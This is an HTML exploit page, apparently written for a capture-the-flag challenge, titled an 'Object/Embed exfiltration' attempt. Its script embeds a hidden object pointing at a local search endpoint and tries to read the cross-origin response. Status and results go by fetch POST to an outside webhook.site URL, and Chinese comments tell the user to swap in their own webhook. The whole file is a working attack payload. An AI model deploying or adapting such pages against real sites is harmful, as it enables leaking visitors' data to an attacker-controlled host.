<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Exploit Page - Object/Embed Attempt</title>
</head>
<body>
    <p>Attempting Object/Embed exfiltration... Check your webhook.</p>
    <script>
        const WEBHOOK_URL = "https://webhook.site/eed6e086-4677-4691-8515-ecf1b5559f63"; // <--- 替換成你的 Webhook URL
        const targetSearchURLBase = "http://127.0.0.1:5000/search";
        const searchQuery = "AIS3";

        async function sendToWebhook(label, data) {
            // ... (與上面相同的 sendToWebhook 函數)
            const payload = { timestamp: new Date().toISOString(), label: label, data: data };
            console.log(`Sending to webhook [${label}]:`, payload);
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'cors'
                });
            } catch (e) {
                console.error(`CRITICAL: Failed to send [${label}] to webhook:`, e);
                fetch(`${WEBHOOK_URL}?error_sending_label=${encodeURIComponent(label)}&error_msg=${encodeURIComponent(e.message)}`);
            }
        }

        sendToWebhook("exploit_v3_started", { message: "Object/Embed attempt started." });

        try {
            const objectTag = document.createElement('object');
            objectTag.data = `${targetSearchURLBase}?q=${encodeURIComponent(searchQuery)}`;
            objectTag.type = "text/html"; // 或 application/json
            objectTag.width = "1";
            objectTag.height = "1";
            objectTag.style.display = "none";
            
            objectTag.onload = function() {
                sendToWebhook("object_loaded", { data_src: objectTag.data });
                try {
                    // 嘗試訪問內容 (極不可能成功)
                    const content = objectTag.contentDocument || objectTag.contentWindow.document;
                    sendToWebhook("object_content_accessed_UNLIKELY", { content_exists: !!content });
                } catch (e) {
                    sendToWebhook("object_content_access_failed", { error: e.message });
                }
            };
            objectTag.onerror = function() {
                sendToWebhook("object_load_error", { data_src: objectTag.data });
            };
            document.body.appendChild(objectTag);
            sendToWebhook("object_appended", { data_src: objectTag.data });

        } catch (e) {
            sendToWebhook("exploit_v3_error", { errorName: e.name, errorMessage: e.message, errorStack: e.stack });
        }
        
        setTimeout(() => {
            sendToWebhook("exploit_v3_finished", { message: "Timeout reached." });
        }, 5000);
    </script>
</body>
</html>
